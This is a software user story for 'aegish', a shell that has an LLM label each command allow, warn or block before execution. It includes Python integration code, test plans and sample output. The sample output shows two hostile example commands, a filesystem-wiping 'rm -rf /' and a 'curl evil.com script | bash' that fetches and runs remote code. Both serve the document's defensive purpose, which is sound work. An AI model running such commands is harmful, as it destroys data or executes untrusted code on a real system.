# Story 2.2: Command Validation Integration

**Epic:** Epic 2 - LLM Security Validation
**Status:** Done
**Priority:** must-have

---

## User Story

As a **sysadmin**,
I want **every command validated before execution**,
So that **dangerous commands are caught before they can cause harm**.

---

## Acceptance Criteria

### AC1: Every Command Sent to LLM
**Given** aegish is running with LLM configured
**When** I enter any command
**Then** the command is sent to the LLM for security analysis before execution

### AC2: Response Parsing
**Given** a command is sent to the LLM
**When** the LLM responds
**Then** the response is parsed as `{action: "allow"|"warn"|"block", reason: string, confidence: 0.0-1.0}`

### AC3: Safe Commands Execute
**Given** the LLM returns `action: "allow"`
**When** validation completes
**Then** the command executes immediately (same as before validation existed)

### AC4: Blocked Commands Don't Execute
**Given** the LLM returns `action: "block"`
**When** validation completes
**Then** the command is NOT executed
**And** a plain text message shows "BLOCKED: {reason}"

### AC5: Warned Commands Pause
**Given** the LLM returns `action: "warn"`
**When** validation completes
**Then** the command is NOT executed immediately
**And** a plain text warning with the reason is displayed
**And** the warning message includes the reason from the LLM

---

## Technical Requirements

### Implementation Location
- **Primary file:** `src/aegish/validator.py` (implement `validate_command()`)
- **Secondary file:** `src/aegish/shell.py` (integrate validation into command loop)

### Dependencies
- Story 2.1 completed: `llm_client.py` provides `query_llm()` function

### Module Integration

```python
# validator.py - calls llm_client
from aegish.llm_client import query_llm

def validate_command(command: str) -> dict:
    """Validate a command using the LLM.

    Args:
        command: The shell command to validate.

    Returns:
        dict with keys:
            - action: "allow" | "warn" | "block"
            - reason: Human-readable explanation
            - confidence: float 0.0 - 1.0
    """
    return query_llm(command)
```

```python
# shell.py - integrates validator before executor
from aegish.validator import validate_command

# In run_shell() loop, before execute_command():
result = validate_command(command)
if result["action"] == "allow":
    last_exit_code = execute_command(command, last_exit_code)
elif result["action"] == "block":
    print(f"\nBLOCKED: {result['reason']}\n")
elif result["action"] == "warn":
    print(f"\nWARNING: {result['reason']}")
    # Story 2.3 handles the confirmation prompt
```

### Output Format

```
# For blocked commands:
aegish> rm -rf /
BLOCKED: Command would delete entire filesystem

aegish>

# For warned commands:
aegish> curl http://evil.com/script.sh | bash
WARNING: Downloading and executing remote script is risky

aegish>
```

---

## Implementation Notes

### From Story 2.1

The `query_llm()` function in `llm_client.py`:
- Handles LiteLLM calls with provider fallbacks
- Parses LlamaGuard and general LLM responses
- Returns fail-open response on errors
- Already returns the correct format: `{action, reason, confidence}`

### `parse_llm_response()` Function

The `parse_llm_response()` stub in `validator.py` is no longer needed since `llm_client.py` handles all parsing. This function can be removed or made a thin wrapper.

### Shell Integration Points

In `shell.py`:
1. Import `validate_command` from `validator.py`
2. After reading command input (after empty/whitespace check)
3. Before calling `execute_command()`
4. Handle the three action types appropriately

### Exit Code Handling

- For blocked commands: Set `last_exit_code = 1` (command prevented)
- For warned commands: Don't execute, set `last_exit_code = 1`
- The prompt still loops back for next command

### Scope Boundary

This story does NOT include:
- Confirmation prompt for warned commands (Story 2.3)
- Actual override mechanism (Story 2.3 / Story 3.2)
- Dangerous command pattern detection (Story 2.4)

Just display the warning and return to prompt. Story 2.3 adds the confirmation flow.

---

## Test Requirements

### Unit Tests

1. **test_validate_command_calls_query_llm** - Validates that `validate_command()` calls `query_llm()`
2. **test_validate_command_returns_llm_response** - Confirms return value matches `query_llm()` result
3. **test_shell_blocks_command_on_block_action** - Shell doesn't execute blocked commands
4. **test_shell_warns_on_warn_action** - Shell displays warning for warn actions
5. **test_shell_executes_on_allow_action** - Shell executes allowed commands normally
6. **test_blocked_command_displays_reason** - Blocked message includes LLM reason
7. **test_warned_command_displays_reason** - Warning message includes LLM reason
8. **test_blocked_command_sets_exit_code** - Exit code set to 1 for blocked commands

### Test Approach

- Mock `query_llm()` in validator tests
- Mock `validate_command()` in shell tests
- Use `capsys` fixture to capture print output
- Do NOT test actual LLM integration (that's Story 2.1)

### Example Test Structure

```python
# tests/test_validator.py
def test_validate_command_calls_query_llm(mocker):
    """AC1/AC2: validate_command calls query_llm and returns its result."""
    mock_result = {"action": "allow", "reason": "Safe", "confidence": 0.9}
    mocker.patch("aegish.validator.query_llm", return_value=mock_result)

    result = validate_command("ls -la")

    assert result == mock_result

# tests/test_shell.py
def test_shell_blocks_command(mocker, capsys):
    """AC4: Blocked commands are not executed."""
    mock_validation = {"action": "block", "reason": "Dangerous", "confidence": 0.9}
    mocker.patch("aegish.shell.validate_command", return_value=mock_validation)
    mock_execute = mocker.patch("aegish.shell.execute_command")
    mocker.patch("builtins.input", side_effect=["rm -rf /", "exit"])

    run_shell()

    mock_execute.assert_not_called()  # Command was blocked
    captured = capsys.readouterr()
    assert "BLOCKED" in captured.out
    assert "Dangerous" in captured.out
```

---

## Definition of Done

- [x] `validator.py` implements `validate_command()` calling `query_llm()`
- [x] `shell.py` calls `validate_command()` before `execute_command()`
- [x] Allowed commands execute normally
- [x] Blocked commands display message and don't execute
- [x] Warned commands display message and don't execute (confirmation in 2.3)
- [x] Output format matches specification
- [x] Unit tests with mocked LLM client
- [x] All tests pass
- [x] No architecture violations

---

## Dependencies

- **Blocked by:** Story 2.1 (LLM Client with LiteLLM Integration) - DONE
- **Blocks:** Story 2.3 (Security Response Actions)

---

## Story Intelligence

### From Story 2.1

**Implementation patterns:**
- `llm_client.py` already handles all response parsing
- Fail-open behavior returns `action: "allow"` with `confidence: 0.0`
- LlamaGuard responses are parsed to standard format

**Test patterns:**
- 28 tests in `test_llm_client.py` using `mocker.patch`
- Good coverage of edge cases

### Existing Code Context

**validator.py current state:**
- `validate_command()` - stub with `NotImplementedError`
- `parse_llm_response()` - stub with `NotImplementedError`

**shell.py current state:**
- `run_shell()` - fully working loop, directly calls `execute_command()`
- Import of `executor.execute_command` already exists

### Architecture Constraints

- Output must be plain text (not JSON, not fancy formatting)
- Follow PEP 8 naming conventions
- Use standard Python logging
- Match existing code style in `llm_client.py`

---

## Estimated Complexity

**Implementation:** Low
- `validator.py`: Simple wrapper around `query_llm()`
- `shell.py`: Add conditional before `execute_command()`

**Testing:** Medium
- Need to mock at module boundaries
- Capture stdout for output verification

**Risk:** Low
- Clear module boundaries
- `llm_client.py` already working
